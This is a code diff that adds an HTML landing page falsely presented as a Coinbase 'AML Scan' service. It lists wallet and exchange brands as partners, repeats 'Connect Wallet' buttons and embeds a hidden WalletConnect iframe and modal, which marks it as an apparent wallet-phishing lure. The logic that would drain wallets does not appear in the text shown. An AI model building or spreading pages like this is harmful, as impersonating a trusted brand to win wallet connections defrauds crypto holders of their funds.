+            var(--wui-color-bg-base-100)
+          );
+          --wui-color-bg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-125)
+          );
+          --wui-color-bg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-150)
+          );
+          --wui-color-bg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-175)
+          );
+          --wui-color-bg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-200)
+          );
+          --wui-color-bg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-225)
+          );
+          --wui-color-bg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-250)
+          );
+          --wui-color-bg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-275)
+          );
+          --wui-color-bg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-300)
+          );
+
+          --wui-color-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-success-base-100)
+          );
+          --wui-color-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-error-base-100)
+          );
+
+          --wui-icon-box-bg-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-error-base-100)
+          );
+          --wui-icon-box-bg-accent-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-blue-base-100)
+          );
+          --wui-icon-box-bg-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-success-base-100)
+          );
+          --wui-icon-box-bg-inverse-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-inverse-base-100)
+          );
+
+          --wui-all-wallets-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-all-wallets-bg-base-100)
+          );
+
+          --wui-avatar-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-avatar-border-base)
+          );
+
+          --wui-thumbnail-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-thumbnail-border-base)
+          );
+        }
+      }
+    </style><style media="enabled">
+      :root {
+        --w3m-color-mix: #000;
+        --w3m-accent: #1b35f8;
+        --w3m-default: #000;
+
+        --wui-color-modal-bg-base: #fff;
+        --wui-color-accent-base-100: var(--w3m-accent);
+
+        --wui-accent-glass-base-090: rgba(51, 150, 255, 0.9);
+        --wui-accent-glass-base-080: rgba(51, 150, 255, 0.8);
+        --wui-accent-glass-base-020: rgba(51, 150, 255, 0.2);
+        --wui-accent-glass-base-015: rgba(51, 150, 255, 0.15);
+        --wui-accent-glass-base-010: rgba(51, 150, 255, 0.1);
+        --wui-accent-glass-base-005: rgba(51, 150, 255, 0.05);
+        --wui-accent-glass-base-002: rgba(51, 150, 255, 0.02);
+
+        --wui-color-fg-base-100: #141414;
+        --wui-color-fg-base-125: #2d3131;
+        --wui-color-fg-base-150: #474d4d;
+        --wui-color-fg-base-175: #636d6d;
+        --wui-color-fg-base-200: #798686;
+        --wui-color-fg-base-225: #828f8f;
+        --wui-color-fg-base-250: #8b9797;
+        --wui-color-fg-base-275: #95a0a0;
+        --wui-color-fg-base-300: #9ea9a9;
+
+        --wui-color-bg-base-100: #ffffff;
+        --wui-color-bg-base-125: #f5fafa;
+        --wui-color-bg-base-150: #f3f8f8;
+        --wui-color-bg-base-175: #eef4f4;
+        --wui-color-bg-base-200: #eaf1f1;
+        --wui-color-bg-base-225: #e5eded;
+        --wui-color-bg-base-250: #e1e9e9;
+        --wui-color-bg-base-275: #dce7e7;
+        --wui-color-bg-base-300: #d8e3e3;
+
+        --wui-color-success-base-100: #26b562;
+        --wui-color-error-base-100: #f05142;
+
+        --wui-success-glass-001: rgba(38, 181, 98, 0.01);
+        --wui-success-glass-002: rgba(38, 181, 98, 0.02);
+        --wui-success-glass-005: rgba(38, 181, 98, 0.05);
+        --wui-success-glass-010: rgba(38, 181, 98, 0.1);
+        --wui-success-glass-015: rgba(38, 181, 98, 0.15);
+        --wui-success-glass-020: rgba(38, 181, 98, 0.2);
+        --wui-success-glass-025: rgba(38, 181, 98, 0.25);
+        --wui-success-glass-030: rgba(38, 181, 98, 0.3);
+        --wui-success-glass-060: rgba(38, 181, 98, 0.6);
+        --wui-success-glass-080: rgba(38, 181, 98, 0.8);
+
+        --wui-error-glass-001: rgba(240, 81, 66, 0.01);
+        --wui-error-glass-002: rgba(240, 81, 66, 0.02);
+        --wui-error-glass-005: rgba(240, 81, 66, 0.05);
+        --wui-error-glass-010: rgba(240, 81, 66, 0.1);
+        --wui-error-glass-015: rgba(240, 81, 66, 0.15);
+        --wui-error-glass-020: rgba(240, 81, 66, 0.2);
+        --wui-error-glass-025: rgba(240, 81, 66, 0.25);
+        --wui-error-glass-030: rgba(240, 81, 66, 0.3);
+        --wui-error-glass-060: rgba(240, 81, 66, 0.6);
+        --wui-error-glass-080: rgba(240, 81, 66, 0.8);
+
+        --wui-icon-box-bg-error-base-100: #f4dfdd;
+        --wui-icon-box-bg-blue-base-100: #d9ecfb;
+        --wui-icon-box-bg-success-base-100: #daf0e4;
+        --wui-icon-box-bg-inverse-base-100: #dcecfc;
+
+        --wui-all-wallets-bg-base-100: #e8f1fa;
+
+        --wui-avatar-border-base: #f3f4f4;
+
+        --wui-thumbnail-border-base: #eaefef;
+
+        --wui-gray-glass-001: rgba(0, 0, 0, 0.01);
+        --wui-gray-glass-002: rgba(0, 0, 0, 0.02);
+        --wui-gray-glass-005: rgba(0, 0, 0, 0.05);
+        --wui-gray-glass-010: rgba(0, 0, 0, 0.1);
+        --wui-gray-glass-015: rgba(0, 0, 0, 0.15);
+        --wui-gray-glass-020: rgba(0, 0, 0, 0.2);
+        --wui-gray-glass-025: rgba(0, 0, 0, 0.25);
+        --wui-gray-glass-030: rgba(0, 0, 0, 0.3);
+        --wui-gray-glass-060: rgba(0, 0, 0, 0.6);
+        --wui-gray-glass-080: rgba(0, 0, 0, 0.8);
+        --wui-gray-glass-090: rgba(0, 0, 0, 0.9);
+      }
+    </style><style>
+      :root {
+        --w3m-color-mix: #fff;
+        --w3m-accent: #1b35f8;
+        --w3m-default: #fff;
+
+        --wui-color-modal-bg-base: #121313;
+        --wui-color-accent-base-100: var(--w3m-accent);
+
+        --wui-accent-glass-base-090: rgba(71, 161, 255, 0.9);
+        --wui-accent-glass-base-080: rgba(71, 161, 255, 0.8);
+        --wui-accent-glass-base-020: rgba(71, 161, 255, 0.2);
+        --wui-accent-glass-base-015: rgba(71, 161, 255, 0.15);
+        --wui-accent-glass-base-010: rgba(71, 161, 255, 0.1);
+        --wui-accent-glass-base-005: rgba(71, 161, 255, 0.05);
+        --wui-accent-glass-base-002: rgba(71, 161, 255, 0.02);
+
+        --wui-color-fg-base-100: #e4e7e7;
+        --wui-color-fg-base-125: #d0d5d5;
+        --wui-color-fg-base-150: #a8b1b1;
+        --wui-color-fg-base-175: #a8b0b0;
+        --wui-color-fg-base-200: #949e9e;
+        --wui-color-fg-base-225: #868f8f;
+        --wui-color-fg-base-250: #788080;
+        --wui-color-fg-base-275: #788181;
+        --wui-color-fg-base-300: #6e7777;
+
+        --wui-color-bg-base-100: #141414;
+        --wui-color-bg-base-125: #191a1a;
+        --wui-color-bg-base-150: #1e1f1f;
+        --wui-color-bg-base-175: #222525;
+        --wui-color-bg-base-200: #272a2a;
+        --wui-color-bg-base-225: #2c3030;
+        --wui-color-bg-base-250: #313535;
+        --wui-color-bg-base-275: #363b3b;
+        --wui-color-bg-base-300: #3b4040;
+
+        --wui-color-success-base-100: #26d962;
+        --wui-color-error-base-100: #f25a67;
+
+        --wui-success-glass-001: rgba(38, 217, 98, 0.01);
+        --wui-success-glass-002: rgba(38, 217, 98, 0.02);
+        --wui-success-glass-005: rgba(38, 217, 98, 0.05);
+        --wui-success-glass-010: rgba(38, 217, 98, 0.1);
+        --wui-success-glass-015: rgba(38, 217, 98, 0.15);
+        --wui-success-glass-020: rgba(38, 217, 98, 0.2);
+        --wui-success-glass-025: rgba(38, 217, 98, 0.25);
+        --wui-success-glass-030: rgba(38, 217, 98, 0.3);
+        --wui-success-glass-060: rgba(38, 217, 98, 0.6);
+        --wui-success-glass-080: rgba(38, 217, 98, 0.8);
+
+        --wui-error-glass-001: rgba(242, 90, 103, 0.01);
+        --wui-error-glass-002: rgba(242, 90, 103, 0.02);
+        --wui-error-glass-005: rgba(242, 90, 103, 0.05);
+        --wui-error-glass-010: rgba(242, 90, 103, 0.1);
+        --wui-error-glass-015: rgba(242, 90, 103, 0.15);
+        --wui-error-glass-020: rgba(242, 90, 103, 0.2);
+        --wui-error-glass-025: rgba(242, 90, 103, 0.25);
+        --wui-error-glass-030: rgba(242, 90, 103, 0.3);
+        --wui-error-glass-060: rgba(242, 90, 103, 0.6);
+        --wui-error-glass-080: rgba(242, 90, 103, 0.8);
+
+        --wui-icon-box-bg-error-base-100: #3c2426;
+        --wui-icon-box-bg-blue-base-100: #20303f;
+        --wui-icon-box-bg-success-base-100: #1f3a28;
+        --wui-icon-box-bg-inverse-base-100: #243240;
+
+        --wui-all-wallets-bg-base-100: #222b35;
+
+        --wui-avatar-border-base: #252525;
+
+        --wui-thumbnail-border-base: #252525;
+
+        --wui-gray-glass-001: rgba(255, 255, 255, 0.01);
+        --wui-gray-glass-002: rgba(255, 255, 255, 0.02);
+        --wui-gray-glass-005: rgba(255, 255, 255, 0.05);
+        --wui-gray-glass-010: rgba(255, 255, 255, 0.1);
+        --wui-gray-glass-015: rgba(255, 255, 255, 0.15);
+        --wui-gray-glass-020: rgba(255, 255, 255, 0.2);
+        --wui-gray-glass-025: rgba(255, 255, 255, 0.25);
+        --wui-gray-glass-030: rgba(255, 255, 255, 0.3);
+        --wui-gray-glass-060: rgba(255, 255, 255, 0.6);
+        --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
+        --wui-gray-glass-090: rgba(255, 255, 255, 0.9);
+      }
+    </style></head>
+ <body><div id="loader"></div>
+  <header>
+   <div class="container">
+    <nav>
+     <a href="#" class="logo">
+      <img src="images/coinbase.png" width="125" height="auto" alt="Coinbase Logo">
+     </a>
+     <button class="first-cta">Connect Walllet</button>
+    </nav>
+   </div>
+  </header>
+  <main id="main-content">
+   <section class="hero">
+    <div class="container">
+     <h1>Coinbase Scan: Secure Compliance for Crypto</h1>
+     <p>Protect your assets and ensure regulatory compliance with our advance Anti-Money Laundering (AML) scanning tool. Connect your wallet and start securing your transactions today.</p>
+     <button class="main-cta">Connect Wallet</button>
+    </div>
+   </section>
+   <section id="partners" class="partners">
+    <div class="container">
+     <h2>Our Trusted Partners</h2>
+     <div class="partners-grid">
+      <div class="partner-card">
+       <img src="images/metamask.png" alt="MetaMask" class="partner-icon">
+       <span>MetaMask</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/trezor.svg" alt="Trezor" class="partner-icon">
+       <span>Trezor</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/ledger.svg" alt="Ledger" class="partner-icon">
+       <span>Ledger</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/kraken.png" alt="Kraken" class="partner-icon">
+       <span>Kraken</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/exodus.svg" alt="Ledger" class="partner-icon">
+       <span>Exodus</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/binance.png" alt="Binance" class="partner-icon">
+       <span>Binance</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/ctc.png" alt="CTC" class="partner-icon">
+       <span>CryptoTaxCalculator</span>
+      </div>
+      <div class="partner-card">
+       <img src="images/trust.png" alt="Trust" class="partner-icon">
+       <span>Trust Wallet</span>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section id="features" class="features">
+    <div class="container">
+     <h2>Key Features of Coinbase AML Scan</h2>
+     <div class="features-grid">
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-passwordWalletLocked-2.svg">
+       </div>
+       <h3>Advanced AML Screening</h3>
+       <p>Utilize cutting-edge algorithms to screen transactions and detect suspicious activities.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-completeQuiz-3.svg">
+       </div>
+       <h3>Real-time Monitoring</h3>
+       <p>Monitor transactions in real-time to identify and flag potential risks instantly.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-globalPayments-3.svg">
+       </div>
+       <h3>Global Compliance</h3>
+       <p>Stay compliant with international AML regulations and standards across different jurisdictions.</p>
+      </div>
+      <div class="feature-card">
+       <div class="feature-icon">
+        <img class="feature-img" src="images/light-key-2.svg">
+       </div>
+       <h3>Secure and Private</h3>
+       <p>Ensure the highest level of security and privacy for all scanned data and results.</p>
+      </div>
+     </div>
+    </div>
+   </section>
+   <section id="benefits" class="benefits">
+    <div class="container">
+     <h2>Benefits of Using Coinbase AML Scan</h2>
+     <ul class="benefits-list">
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Reduce compliance risks and avoid penalties</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Streamline your AML processes and save time</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Enhance your reputation as a trusted crypto business</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Access detailed reports for auditing purposes</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Stay ahead of evolving regulatory requirements</span>
+      </li>
+      <li class="benefit-item">
+       <span class="benefit-icon">
+        <img src="images/light-done-2.svg" class="benefit-img">
+       </span>
+       <span>Protect your business from financial crimes</span>
+      </li>
+     </ul>
+    </div>
+   </section>
+   <section class="cta">
+    <div class="container">
+     <h2>Ready to Enhance Your AML Compliance?</h2>
+     <p>Join thousands of businesses that trust Coinbase for their AML compliance needs. Get started with our powerful AML scanning tool today.</p>
+     <div class="cta-buttons">
+      <button class="secondary-cta">Connect Wallet</button>
+     </div>
+    </div>
+   </section>
+  </main>
+  <footer>
+   <div class="container">
+    <div class="footer-content">
+     <div class="footer-column">
+      <h3>Products</h3>
+      <ul>
+       <li>
+        <a href="#">AML Scan</a>
+       </li>
+       <li>
+        <a href="#">Wallet</a>
+       </li>
+       <li>
+        <a href="#">Exchange</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Learn</h3>
+      <ul>
+       <li>
+        <a href="#">Blog</a>
+       </li>
+       <li>
+        <a href="#">Crypto basics</a>
+       </li>
+       <li>
+        <a href="#">Market updates</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Company</h3>
+      <ul>
+       <li>
+        <a href="#">About</a>
+       </li>
+       <li>
+        <a href="#">Careers</a>
+       </li>
+       <li>
+        <a href="#">Press</a>
+       </li>
+      </ul>
+     </div>
+     <div class="footer-column">
+      <h3>Social</h3>
+      <ul>
+       <li>
+        <a href="#">Twitter</a>
+       </li>
+       <li>
+        <a href="#">Facebook</a>
+       </li>
+       <li>
+        <a href="#">LinkedIn</a>
+       </li>
+      </ul>
+     </div>
+    </div>
+    <div class="footer-bottom">
+     <p>© 2025 Coinbase. All rights reserved.</p>
+    </div>
+   </div>
+  </footer>
+  <script>
+   document.querySelector('.mobile-menu-toggle').addEventListener('click', function() {
+    document.querySelector('.nav-links').classList.toggle('active');
+   });
+  </script>
+ 
+
+<iframe id="verify-api" src="https://verify.walletconnect.com/b56d0b79dfd0159466b6fd74c62c2c52" style="display: none;"></iframe><w3m-modal></w3m-modal></body></html>
